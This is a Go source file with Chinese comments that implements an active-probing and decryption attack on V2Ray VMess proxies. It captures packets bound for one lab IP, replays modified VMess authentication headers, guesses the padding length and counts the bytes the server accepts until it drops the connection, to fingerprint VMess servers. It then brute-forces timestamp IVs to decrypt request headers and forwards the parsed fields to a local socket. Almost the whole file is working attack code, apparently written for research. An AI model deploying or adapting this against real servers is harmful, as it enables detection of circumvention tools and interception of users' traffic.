package main

import (
	"bytes"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"hash"
	"log"
	"net"
	"strconv"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	"v2ray.com/core/common"
	"v2ray.com/core/common/buf"
	"v2ray.com/core/common/crypto"
	mnet "v2ray.com/core/common/net"
	"v2ray.com/core/common/protocol"
	"v2ray.com/core/common/serial"
	"v2ray.com/core/common/uuid"
)

var (
	device        string = "......."
	snapshotLen   int32  = 1024
	promiscuous   bool   = false
	err           error
	timeout       time.Duration = 30 * time.Second
	handle        *pcap.Handle
	tmpIpList     map[string][]string // 一个ip可能对应多个端口
	foreverIpList map[string][]string
	lock          sync.Mutex
)

func main() {

	//file, _ := os.Open("E://tmp.txt")
	//data:=make([]byte,2048)
	//file.Read(data)
	//decrypt(data)
	tmpIpList = make(map[string][]string, 10)
	foreverIpList = make(map[string][]string, 10)

	handle, err = pcap.OpenLive(device, snapshotLen, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	for {
		var wg sync.WaitGroup
		wg.Add(20)
		for i := 0; i < 20; i++ {
			packet, _ := packetSource.NextPacket()
			go func() {
				printPacketInfo(packet)
				wg.Done()
			}()
		}
		wg.Wait()
	}

}

func hashTimestamp(h hash.Hash, t uint64) []byte {
	serial.WriteUint64(h, t)
	serial.WriteUint64(h, t)
	serial.WriteUint64(h, t)
	serial.WriteUint64(h, t)
	return h.Sum(nil)
}

type Data struct {
	Raw    string
	Srcip  string
	Dstip  string
	Sport  string
	Dport  string
	Length string
	Ver    string
	Iv     string
	Key    string
	V      string
	Opt    string
	P      string
	Sec    string
	Re     string
	Cmd    string
	Port   mnet.Port
	A      string
	Random string
	F      string
}

var addrParser = protocol.NewAddressParser(
	protocol.AddressFamilyByte(byte(protocol.AddressTypeIPv4), mnet.AddressFamilyIPv4),
	protocol.AddressFamilyByte(byte(protocol.AddressTypeDomain), mnet.AddressFamilyDomain),
	protocol.AddressFamilyByte(byte(protocol.AddressTypeIPv6), mnet.AddressFamilyIPv6),
	protocol.PortThenAddress(),
)

func decrypt(data []byte, srcip, dstip, sport, dport, length string) {
	fmt.Println("开始解密")
	buffer := buf.New()
	defer buffer.Release()
	tmpdata := data
	data = data[16:]
	cmdkey := make([]byte, 16)
	md5hash := md5.New()
	uid, _ := uuid.ParseString("")
	common.Must2(md5hash.Write(uid.Bytes()))
	common.Must2(md5hash.Write([]byte("")))
	md5hash.Sum(cmdkey[:0])

	//循环
	timestamp := uint64(time.Now().Unix())
	pre := timestamp - 120
	flag := false
	for i := timestamp; i > pre; i-- {
		iv := hashTimestamp(md5.New(), i)
		aesStream := crypto.NewAesDecryptionStream(cmdkey, iv[:])
		decryptor := crypto.NewCryptionReader(aesStream, bytes.NewReader(data))

		buffer.Clear()
		if _, err := buffer.ReadFullFrom(decryptor, 38); err != nil {
			fmt.Errorf(err.Error())
			return
		}
		str := hex.EncodeToString(buffer.Bytes())
		if buffer.Byte(0) == 1 && buffer.Byte(37) == 1 {
			fmt.Println("++++++解密成功++++++")
			flag = true
			fmt.Println(str)
			// 将数据发送给python
			Command := protocol.RequestCommand(buffer.Byte(37))
			var myAddress mnet.Address
			var myPort mnet.Port
			switch Command {
			case protocol.RequestCommandMux:
				myAddress = mnet.DomainAddress("v1.mux.cool")
				myPort = 0
			case protocol.RequestCommandTCP, protocol.RequestCommandUDP:
				if addr, port, err := addrParser.ReadAddressPort(buffer, decryptor); err == nil {
					myAddress = addr
					myPort = port
				} else {
					fmt.Println(err.Error())
					return
				}
			}

			_, err := buffer.ReadFullFrom(decryptor, 4)
			len := buffer.Len()
			padlen := int32(buffer.Byte(35) >> 4)
			mydata := Data{
				Raw:    hex.EncodeToString(tmpdata[0 : len-1]),
				Srcip:  srcip,
				Dstip:  dstip,
				Sport:  sport,
				Dport:  dport,
				Length: length,
				Ver:    hex.EncodeToString([]byte{buffer.Byte(0)}),
				Iv:     hex.EncodeToString(buffer.BytesRange(1, 17)),
				Key:    hex.EncodeToString(buffer.BytesRange(17, 33)),
				V:      hex.EncodeToString([]byte{buffer.Byte(33)}),
				Opt:    hex.EncodeToString([]byte{buffer.Byte(34)}),
				P:      hex.EncodeToString([]byte{buffer.Byte(35) >> 4}),
				Sec:    hex.EncodeToString([]byte{buffer.Byte(35) % 16}),
				Re:     hex.EncodeToString([]byte{buffer.Byte(36)}),
				Cmd:    hex.EncodeToString([]byte{buffer.Byte(37)}),
				Port:   myPort,
				A:      myAddress.String(),
				Random: hex.EncodeToString(buffer.BytesRange(len-5-padlen, len-5)),
				F:      hex.EncodeToString(buffer.BytesRange(len-5, len-1)),
			}
			myjson, _ := json.Marshal(mydata)

			conn, err := net.Dial("tcp", "localhost:9999")
			if err != nil {
				fmt.Errorf(err.Error())
				return
			}
			conn.Write(myjson)
			break
		}

	}
	if !flag {
		fmt.Println("解密失败")
	}

}

func attack(data []byte, srcip, dstip, sport, dport, length string) {
	fmt.Printf("进行攻击：%s:%s", dstip, dport)
	original := data[0 : 16+38]
	fmt.Println("auth + command", original)
	isVmess := true
	wg := sync.WaitGroup{}
	wg.Add(0xf + 1)
	minP := 9999
	maxP := -1
	for i := 0; i <= 0xf; i++ {
		weAreDetected := func(encryptedP int) {
			defer wg.Done()
			time.Sleep(time.Millisecond * 10)
			conn, err := net.Dial("tcp", "172.22.183.99:1234")
			if err != nil {
				fmt.Println(err)
				isVmess = false
				return
			}
			defer conn.Close()

			attack := [16 + 38]byte{}
			copy(attack[:], original[:])

			attack[16+32] = byte(encryptedP) //last byte of key

			tmp := attack[16+35]
			attack[16+35] = (byte(encryptedP) << 4) | (tmp & 0xf) //guess paddingLen
			n, err := conn.Write(attack[:])
			if err != nil || n != 16+38 {
				fmt.Println(err)
				isVmess = false
				return
			}
			for j := 0; j < 9999; j++ {
				//disable BufferReader's buffering
				time.Sleep(time.Millisecond * 10)

				zero := [1]byte{}
				_, err := conn.Write(zero[:])
				if err != nil {
					if j-1 < minP {
						minP = j - 1
					}
					if j-1 > maxP {
						maxP = j - 1
					}
					fmt.Println("M =", j-1)
					return
				}
			}
		}
		go weAreDetected(i)
	}
	wg.Wait()

	if isVmess && (maxP-minP == 15) {
		// 如果攻击测试成功，增加相应记录到永久列表中
		fmt.Printf("%s:%s是vmess服务", dstip, dstip)
		lock.Lock()
		if _, ok := foreverIpList[dstip]; ok {
			tmpIpList[dstip] = append(foreverIpList[dstip], dport)
		} else {
			foreverIpList[dstip] = make([]string, 1)
			foreverIpList[dstip] = append(foreverIpList[dstip], dport)
		}
		lock.Unlock()
		decrypt(data, srcip, dstip, sport, dport, length)
	} else {
		// 如果攻击测试失败，则从临时列表中已加入的端口删除
		lock.Lock()
		list := tmpIpList[dstip]
		for i := range list {
			if list[i] == dport {
				fmt.Printf("删除了%s", list[i])
				tmp := list[0:i]
				tmp = append(tmp, list[i+1:]...)
				tmpIpList[dstip] = tmp
			}
		}
		lock.Unlock()
	}
}

func printPacketInfo(packet gopacket.Packet) {
	// Let's see if the packet is an ethernet packet
	// 判断数据包是否为以太网数据包，可解析出源mac地址、目的mac地址、以太网类型（如ip类型）等
	// 判断数据包是否为IP数据包，可解析出源ip、目的ip、协议号等
	ipLayer := packet.Layer(layers.LayerTypeIPv4)
	if ipLayer != nil {
		//fmt.Println("IPv4 layer detected.")
		ip, _ := ipLayer.(*layers.IPv4)
		srcip := ip.SrcIP.String()
		dstip := ip.DstIP.String()
		if dstip != "172.22.183.99" {
			return
		}
		//fmt.Printf("From %s to %s\n", ip.SrcIP, ip.DstIP)
		tcpLayer := packet.Layer(layers.LayerTypeTCP)
		if tcpLayer != nil {

			tcp, _ := tcpLayer.(*layers.TCP)
			// TCP layer variables:
			// SrcPort, DstPort, Seq, Ack, DataOffset, Window, Checksum, Urgent
			// Bool flags: FIN, SYN, RST, PSH, ACK, URG, ECE, CWR, NS
			data := tcp.Payload
			sport := strconv.Itoa(int(tcp.SrcPort))
			dport := strconv.Itoa(int(tcp.DstPort))
			if len(data) < 60 {
				return
			}
			fmt.Println("\nTCP layer detected.")
			fmt.Printf("From port %s to %s\n", sport, dport)
			fmt.Println("Sequence number: ", tcp.Seq)
			fmt.Println(hex.EncodeToString(data))
			// 如果在临时列表中，说明此刻有线程正在攻击测试，直接返回
			lock.Lock()
			flag := false
			if ports, ok := foreverIpList[dstip]; ok {
				fmt.Printf("永久列表%v\n", tmpIpList)
				lock.Unlock()
				flag = true
				for _, p := range ports {
					if p == dport {
						fmt.Println("在永久列表中，直接进行解密")
						decrypt(data, srcip, dstip, sport, dport, strconv.Itoa(len(tcp.Payload)))
						return
					}
				}
			}
			if ports, ok := tmpIpList[dstip]; ok {
				fmt.Printf("临时列表%v\n", tmpIpList)
				lock.Unlock()
				flag = true
				for _, p := range ports {
					if p == dport {
						return
					}
				}
			}
			if !flag {
				// 如果都不在，则进入下段代码进行攻击测试
				lock.Unlock()
			}

			//进行攻击前默认是vmess协议
			lock.Lock()
			if _, ok := tmpIpList[dstip]; ok {
				tmpIpList[dstip] = append(tmpIpList[dstip], dport)
			} else {
				tmpIpList[dstip] = make([]string, 1)
				tmpIpList[dstip] = append(tmpIpList[dstip], dport)
			}
			lock.Unlock()
			attack(data, srcip, dstip, sport, dport, strconv.Itoa(len(tcp.Payload)))
		}
	}
}
